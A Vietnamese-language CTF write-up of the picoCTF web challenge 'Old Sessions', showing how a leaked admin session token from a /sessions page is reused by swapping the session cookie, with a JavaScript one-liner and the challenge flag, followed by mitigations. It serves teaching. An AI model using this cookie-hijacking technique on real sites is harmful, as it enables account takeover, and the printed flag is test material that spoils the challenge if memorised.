# 🚩 Old Sessions

> **Category:** Web Exploitation
> **Difficulty:** Easy
> **Author:** David Gaviria

---

## 📚 Mục lục

* 📌 Tổng quan
* 🧠 Phân tích đề bài
* 🔍 Quá trình khai thác
* 🛠 Payload / Steps
* 🏁 Flag
* 📚 Bài học rút ra

---

# 📌 Tổng quan

Challenge mô phỏng một website mạng xã hội cũ với cơ chế đăng nhập lỗi thời.

Tác giả gợi ý:

> “Once you login, you never have to log-out again”

Điều này cho thấy hệ thống **quản lý session sai cách**, session không hết hạn và có thể bị tái sử dụng.

---

# 🧠 Phân tích đề bài

Thông thường sau khi người dùng đăng nhập:

* Server tạo session token
* Token được lưu trong cookie
* Session phải có thời gian hết hạn

Tuy nhiên ở challenge này:

✅ Session được giữ vĩnh viễn
✅ Session cũ vẫn tồn tại
✅ Người khác có thể reuse token cũ để chiếm tài khoản

➡️ Đây là lỗi:

```txt id="cg8mqz"
Broken Authentication / Session Misconfiguration
```

---

# 🔍 Quá trình khai thác

## 1️⃣ Đăng ký tài khoản mới

Tại trang login, chọn **Register**

Tạo user test:

```txt id="xz6j6q"
Username: test123
Password: test123
```

Sau khi đăng nhập thành công sẽ vào homepage.

---

## 2️⃣ Tìm manh mối trên trang chủ

Trong phần comment xuất hiện dòng:

```txt id="75rj8p"
Hey I found a strange page at /sessions
```

🔥 Đây chính là hint trực tiếp từ challenge.

---

## 3️⃣ Truy cập endpoint ẩn

Mở:

```txt id="g33g0i"
/sessions
```

Website trả về:

```txt id="weqkjo"
1) session:n-S2UvxwThqIukQ_EYbaYBuRjAwRvMTG7IBGQn9Un9g, {'key': 'admin'}

2) session:-DvA0JqD3KXId7-G6uD9vWu-X9mYE8gbAF6ffSZefxA, {'key': 'test123'}
```

---

## 🚨 Phân tích kết quả

Server đã làm lộ danh sách session của người dùng.

Trong đó có:

```txt id="m1n6ff"
admin session token
```

➡️ Nếu dùng token này, ta có thể đăng nhập thành **admin** mà không cần mật khẩu.

---

# 🔓 Chiếm quyền admin

## 4️⃣ Thay đổi cookie session

Mở DevTools:

```txt id="0rv5e6"
F12 → Application → Cookies
```

Tìm cookie:

```txt id="g52dxf"
session
```

Đổi value thành:

```txt id="vuyj85"
n-S2UvxwThqIukQ_EYbaYBuRjAwRvMTG7IBGQn9Un9g
```

Sau đó refresh trang.

---

## 5️⃣ Thành công

Trang chủ hiển thị:

```txt id="w4v2it"
Welcome admin
```

Và flag xuất hiện ngay phía dưới.

---

# 🛠 Payload / Script

## JavaScript đổi cookie nhanh

```javascript
document.cookie="session=n-S2UvxwThqIukQ_EYbaYBuRjAwRvMTG7IBGQn9Un9g; path=/";
location.reload();
```

---

# 🏁 Flag

```html
picoCTF{s3t_s3ss10n_3xp1rat10n5_53a328ed}
```

---

# 📚 Bài học rút ra

| Lỗi bảo mật           | Giải thích                      |
| --------------------- | ------------------------------- |
| Session Never Expires | Session tồn tại quá lâu         |
| Session Disclosure    | Lộ token trong `/sessions`      |
| Broken Authentication | Có thể login không cần password |
| Privilege Escalation  | Chiếm quyền admin               |

---

# 💡 Cách phòng chống

✅ Đặt thời gian hết hạn session
✅ Xóa session sau logout
✅ Không public danh sách session
✅ Rotate session sau login
✅ HttpOnly + Secure cookie

---

# 🧾 Tổng kết

Challenge này khai thác rất thực tế:

```txt id="ptcpx2"
Register → Login → /sessions → Lấy token admin → Đổi cookie → Get Flag
```

> 🔥 Session token cũng quan trọng như mật khẩu.
> Nếu token bị lộ, tài khoản coi như mất.

---
